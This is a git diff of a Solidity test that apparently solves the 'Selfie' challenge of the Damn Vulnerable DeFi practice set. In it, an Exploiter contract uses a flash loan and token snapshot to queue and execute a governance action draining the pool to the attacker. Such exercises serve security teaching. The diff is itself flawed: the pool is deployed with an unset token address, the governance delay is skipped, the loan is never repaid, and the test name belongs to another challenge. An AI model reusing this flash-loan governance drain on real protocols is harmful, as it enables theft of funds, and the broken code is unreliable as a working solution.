@@ -7,7 +7,7 @@ import {TestWithUsers}              from "../TestWithUsers.sol";
 import {SelfiePool}                 from "../selfie/SelfiePool.sol";
 import {SimpleGovernance}           from "../selfie/SimpleGovernance.sol";
 import {DamnValuableTokenSnapshot}  from "../DamnValuableTokenSnapshot.sol";
-import "../DamnValuableToken.sol";
+import {DamnValuableToken}         from "../DamnValuableToken.sol";
 
 
 /**
@@ -25,36 +25,37 @@ contract SelfieTest is TestWithUsers {
     
     SelfiePool pool;
     SimpleGovernance governance;   
-    DamnValuableTokenSnapshot damnValueableToken;
-
+    DamnValuableTokenSnapshot damnValuableTokenSnapshot;
+    DamnValuableToken damnValuableToken;
     User attacker;
 
     function setUp() public {
+        
+        emit log_string('test');
 
         // Setup test user/users
         User[] memory users = getSigners(1);
         attacker = users[0];
 
         // Deploy test contracts
-        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
-        governance = new SimpleGovernance(address(token));
-        pool = new SelfiePool(address(token), address(governance));
-
+        damnValuableTokenSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
+        governance = new SimpleGovernance(address(damnValuableTokenSnapshot));
+        pool = new SelfiePool(address(damnValuableToken), address(governance));
+        vm.label(attacker.account, 'ATTACKER');
         // Give the pool 1.5m tokens
-        token.transfer(address(pool), TOKENS_IN_POOL);
-        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
+        damnValuableToken.transfer(address(pool), TOKENS_IN_POOL);
     }
     function successConditions() internal {
         // Attacker has taken all tokens from the pool
-        assertEq(token.balanceOf(attacker.account), TOKENS_IN_POOL);
-        assertEq(token.balanceOf(address(pool)), 0);
+        assertEq(damnValuableToken.balanceOf(attacker.account), TOKENS_IN_POOL);
+        assertEq(damnValuableToken.balanceOf(address(pool)), 0);
     }
 
     Exploiter exploiter;
 
     function testRewarderExploit() public {
         exploiter = new Exploiter(
-            token,
+            damnValuableTokenSnapshot,
             governance,
             damnValuableToken,
             pool,
@@ -63,9 +64,6 @@ contract SelfieTest is TestWithUsers {
 
         vm.startPrank(attacker.account);
         exploiter.bad();
-
-
-        // VVV (DO NOT TOUCH THIS LINE) VVV
         successConditions(); 
     }
 }
@@ -73,34 +71,34 @@ contract SelfieTest is TestWithUsers {
 contract Exploiter {
 
     DamnValuableTokenSnapshot token;
-    SimpleGovernance governance;
+    DamnValuableToken damnValuableToken;
+    SimpleGovernance simpleGovernance;
     SelfiePool selfiePool;
     address badGuy;
 
     constructor(
-        ERC20Snapshot _token,
+        DamnValuableTokenSnapshot _token,
         SimpleGovernance _governance, 
-        DamnValuableTokenSnapshot _liquidityToken,
+        DamnValuableToken _damnValuableToken,
         SelfiePool _pool,
         address attacker
     ) public {
-        erc20Snapshot = _token;
+        token = _token;
         simpleGovernance = _governance;
-        damnValuableToken = _liquidityToken;
-        pool = _pool;
+        damnValuableToken = _damnValuableToken;
+        selfiePool = _pool;
         badGuy = attacker;
         damnValuableToken.approve(address(simpleGovernance), type(uint256).max);
     }
 
     function bad() public {
-        pool.flashLoan(1_500_000 ether);
+        selfiePool.flashLoan(1_500_000 ether);
     }
 
     function receiveTokens(address damnValuableToken, uint256 amount) public {
-        // attacker has enough, to queue an action
-        // governance.queueAction(address(this), )
-        // attacker queues action in governance contract
-        rewardToken.transfer(badGuy, rewardToken.balanceOf(address(this)));
-        liquidityToken.transfer(msg.sender, amount);
+        token.snapshot();
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", badGuy);
+        simpleGovernance.queueAction(badGuy, data, 1_500_000);
+        simpleGovernance.executeAction(0);
     }
 }
